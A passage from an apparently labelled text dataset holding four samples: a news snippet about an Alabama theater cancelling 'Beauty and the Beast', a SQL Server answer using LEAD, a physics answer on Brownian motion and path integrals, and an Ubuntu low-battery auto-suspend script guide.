apparent gay content. ”It is with great sorrow that I have to tell our customers that we will not be showing ’Beauty and the Beast,’” read a message on the Facebook page of the Henagar   Theatre in the northeast portion of the state.  ”We will not compromise on what the Bible teaches,” the message continued. ”We will continue to show   films so you can feel free to come watch wholesome movies without worrying about sex, nudity, homosexuality and foul language.” The message was removed Friday evening, but CNN affiliate WHNT in Huntsville, Alabama has it here. CNN’s attempts to reach the theater owners were unsuccessful. The Facebook post drew thousands of responses from both supporters and opponents.",0
"<p>Although this might be a bit of a co-incidence due to the artificial nature of your test data, being as you mentioned SQL 2012 I tried a rewrite:</p>

<pre><code>SELECT  ID,
        Comp,
        D,
        D2 = LEAD(D) OVER(PARTITION BY COMP ORDER BY D)
FROM    dbo.T 
WHERE   D IS NOT NULL
ORDER BY Comp;
</code></pre>

<p>This yielded a nice low-cost plan using your index and with significantly lower reads than the other options (and the same results for your test data).</p>

<p><img src=""https://i.stack.imgur.com/7tpdL.png"" alt=""Plan Explorer costs for four options: Original; original with hint; outer apply and Lead""></p>

<p>I suspect your real data is more complicated so there might be some scenarios where this query behaves semantically different to yours, but it does show sometimes the new features can make a real difference.</p>

<p>I did experiment with some more varied data and found some scenarios to match and some not:</p>

<pre><code>--Example 1: results matched
TRUNCATE TABLE dbo.t

-- Generate some more interesting test data
;WITH cte AS
(
SELECT TOP 1000 ROW_NUMBER() OVER ( ORDER BY ( SELECT 1 ) ) rn
FROM master.sys.columns c1
    CROSS JOIN master.sys.columns c2
    CROSS JOIN master.sys.columns c3
)
INSERT T (A, B, C, D)
SELECT  'A' + CAST( a.rn AS VARCHAR(5) ),
        'B' + CAST( a.rn AS VARCHAR(5) ),
        'C' + CAST( a.rn AS VARCHAR(5) ),
        DATEADD(DAY, a.rn + b.rn, '1 Jan 2013')
FROM cte a
    CROSS JOIN cte b
WHERE a.rn % 3 = 0
 AND b.rn % 5 = 0
ORDER BY 1, 2, 3
GO


-- Original query
SELECT  t1.ID,
        t1.Comp,
        t1.D,
        D2 = (  SELECT  TOP 1 D
                FROM    dbo.T t2
                WHERE   t2.Comp = t1.Comp
                AND     t2.D &gt; t1.D
                ORDER BY D
            )
INTO #tmp1
FROM    dbo.T t1 
WHERE   t1.D IS NOT NULL
ORDER BY t1.Comp;
GO

SELECT  ID,
        Comp,
        D,
        D2 = LEAD(D) OVER(PARTITION BY COMP ORDER BY D)
INTO #tmp2
FROM    dbo.T 
WHERE   D IS NOT NULL
ORDER BY Comp;
GO


-- Checks ...
SELECT * FROM #tmp1
EXCEPT
SELECT * FROM #tmp2

SELECT * FROM #tmp2
EXCEPT
SELECT * FROM #tmp1


Example 2: results did not match
TRUNCATE TABLE dbo.t

-- Generate some more interesting test data
;WITH cte AS
(
SELECT TOP 1000 ROW_NUMBER() OVER ( ORDER BY ( SELECT 1 ) ) rn
FROM master.sys.columns c1
    CROSS JOIN master.sys.columns c2
    CROSS JOIN master.sys.columns c3
)
INSERT T (A, B, C, D)
SELECT  'A' + CAST( a.rn AS VARCHAR(5) ),
        'B' + CAST( a.rn AS VARCHAR(5) ),
        'C' + CAST( a.rn AS VARCHAR(5) ),
        DATEADD(DAY, a.rn, '1 Jan 2013')
FROM cte a

-- Add some more data
INSERT dbo.T (A, B, C, D)
SELECT A, B, C, D 
FROM dbo.T
WHERE DAY(D) In ( 3, 7, 9 )


INSERT dbo.T (A, B, C, D)
SELECT A, B, C, DATEADD( day, 1, D )
FROM dbo.T
WHERE DAY(D) In ( 12, 13, 17 )


SELECT * FROM #tmp1
EXCEPT
SELECT * FROM #tmp2

SELECT * FROM #tmp2
EXCEPT
SELECT * FROM #tmp1

SELECT * FROM #tmp2
INTERSECT
SELECT * FROM #tmp1


select * from #tmp1
where comp = 'A2-B2-C2'

select * from #tmp2
where comp = 'A2-B2-C2'
</code></pre>
",0
"<p>Dear gsAllan, in the real world, the Brownian motion is the result of collisions of the moving object we study - a pollen particle - with small (water) molecules that have some positions and that may be described by the variational method - either in classical mechanics or in quantum field theory (where I mean the Feynman path integral by the variational method), at least in principle. </p>

<p>Once you do so with all the real-world degrees of freedom of all the water molecules that are unmeasurable in practice, you will find out that the system is described by continuous functions and the pollen particle moves continuously all the time. There will exist a typical ""mean path"" and ""mean time between collisions"" and during this time, the velocity of the pollen particle will be finite (and piecewise linear, with the turning points that may be either sharp or smoothened into a finite acceleration, depending on the description of the collisions: whether you repel them by an infinite potential wall or a finite repulsive potential).</p>

<p>What you're apparently talking about, however, is a simplified or idealized description of the Brownian motion where the force is ""random"", i.e. when one doesn't claim to be able to keep track of the positions of all the water molecules and where one only wants to compute the statistical averages (e.g. of the distance how far the pollen particle gets). </p>

<p>And moreover, the randomness of the force is extrapolated to arbitrarily short distance scales. In that case, the velocities are not continuous and it would make no sense to describe the motion by the variational principle because the action itself would have to contain some ""random"" parameters as well. Because the energy of the pollen particle may be always transferred from/to the water molecules, the energy conservation is inconsequential, too. Systems where ""nothing useful is conserved"" are usually not usefully described by the actions.</p>

<p>The very purpose of the variational principle is to find the single one unique canonical correct solution for the trajectory. But if there are random forces, there is no single correct trajectory.</p>

<p><strong>Quantum mechanics</strong></p>

<p>However, there is an interesting relationship of the Brownian motion and the quantum version of the variational principle. In quantum mechanics, the action may also be declared to be the ""primary object"" defining all of dynamics. The approach is called the Feynman path integral definition of quantum mechanics. One sums the phase $\exp(iS/\hbar)$ over all trajectories, where $S$ is the action of the trajectory, $i$ is the imaginary unit, and $\hbar$ is the reduced Planck's constant, and interprets the sum as the probability amplitude for a transition.</p>

<p>Interestingly enough, the typical trajectories that contribute to the Feynman path integral look much like the trajectories of the Brownian motion! So the Brownian motion paths have a profound importance for physics formulated in terms of the action - but only at the quantum level.</p>
",0
"<p><strong>Step one: make pm-suspend accessible to all users, no password asked</strong></p>

<p>Do <code>sudo visudo</code> and add this line at the end of the file: <code>yourusername ALL=NOPASSWD: /usr/sbin/pm-suspend</code></p>

<p>Source: <a href=""https://askubuntu.com/q/159007/295286"">How do I run specific sudo commands without a password?</a></p>

<p><strong>Step two: create batwatch.desktop file:</strong></p>

<p>This is the file that will launch automatically the monitoring script. The file must be stored in <code>$HOME/.config/autostart/</code> folder. </p>

<pre><code>[Desktop Entry]
Type=Application
Exec=/home/serg/bin/batwatch.sh
Hidden=false
NoDisplay=false
Name=Battery Monitor Script
</code></pre>

<p>Notice that the script is in my <code>/home/serg/bin</code> folder. You can use whatever folder you like, but for the sake of standards /usr/bin or /home/username/bin would be more prefered. </p>

<p>Source: <a href=""https://askubuntu.com/a/500147/295286"">How to run a script on startup</a></p>

<p><strong>Step three:create the actual script, save in the same location as Exec= line</strong></p>

<p>Here's the actual script. Notice, I'm using bash there, but it also should work with korn shell. I added some comments, so read those to understand what the script does exactly</p>

<pre><code>#!/bin/bash

# Check if the battery is connected
if [ -e /sys/class/power_supply/BAT1 ]; then

    # this line is for debugging mostly. Could be removed
    #notify-send --icon=info ""STARTED MONITORING BATERY""
    zenity --warning --text ""STARTED MONITORING BATERY""

    while true;do   
            # Get the capacity
            CAPACITY=$( cat /sys/class/power_supply/BAT1/uevent | grep -i capacity | cut -d'=' -f2 )

            case $CAPACITY in
            # do stuff when we hit 11 % mark
            [0-9]|11)
                # send warning and suspend only if battery is discharging
                # i.e., no charger connected
                STATUS=$(  cat /sys/class/power_supply/BAT1/uevent | grep -i status | cut -d'=' -f2 )
                 if [ $(echo $STATUS) == ""Discharging"" ]; then

                    #notify-send --urgency=critical --icon=dialog-warning ""LOW BATTERY! SUSPENDING IN 30 sec""
                    zenity --warning --text ""LOW BATTERY! SUSPENDING IN 30 sec""
                    sleep 30
                    gnome-screensaver-command -l &amp;&amp; sudo pm-suspend
                    break
                 fi
                ;;
            *)
            sleep 1
                continue
                ;;
            esac
    done
fi
</code></pre>

<p><strong>Step four: reboot and test if the script works</strong></p>

<p>For this purpose you can adjust the number  <code>[0-9]|11)</code> to whatever value you like, for example <code>65)</code> to suspend at 65%. The you will suspend only if you're not connected to power supply (i.e, not charging). </p>

<p>Let me know if you like this, and if it works, make sure to upvote and click the grey checkmark to the left side of my answer !</p>

<p>Cheers !</p>
",0
